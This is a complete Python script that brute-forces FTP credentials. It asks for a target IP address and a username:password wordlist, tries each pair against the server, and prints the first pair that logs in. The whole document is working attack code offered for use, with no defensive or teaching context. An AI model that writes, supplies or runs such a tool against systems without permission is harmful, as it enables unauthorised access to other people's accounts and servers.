#!/usr/bin/python


import ftplib


def bruteLogin(hostname,passwdFile):
	try:
		pF = open(passwdFile,"r")
	except:
		print ("[-] File Does not Exist")
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip("\n")
		print ("Trying: "+userName +"/"+passWord)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(userName,passWord)
			print ("FTP connection succeed with "+userName+" and password is: "+passWord)
			ftp.quit()
			return(userName,passWord)
		except:
			pass
	print ("[-] Password not Found.........!!!!!!!!!!") 


host = input("[*] Enter Target IP Address: ")
passwdFile = input("[*] Enter Path Of username/password file: ")

bruteLogin(host,passwdFile)
